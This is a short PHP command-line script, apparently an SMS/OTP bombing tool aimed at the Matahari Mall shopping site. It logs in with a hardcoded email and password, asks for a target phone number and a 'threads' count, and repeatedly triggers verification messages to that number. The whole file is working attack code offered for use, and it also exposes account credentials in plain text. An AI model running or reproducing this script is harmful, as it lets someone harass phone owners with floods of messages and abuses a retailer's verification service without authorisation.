<?php
include 'functions.php';

/*
    Matahari Mall Client System
    Made by Handika Pratama
    Modified by Fray117
*/

$init = new mataharimall();
// Configure Mataharimall Account
$init->email = "someagaiuiu4ahh39%40gmail.com";
$init->pass = "179g379g1g3aofhuo";
$init->Login($init->email,$init->pass);

// Execution
echo "\033[32;1mTarget (using country code): ";
$a = trim(fgets(STDIN));
$init->target = "$a";
echo "Threads: ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) {
    $init->Verif($init->target);
}
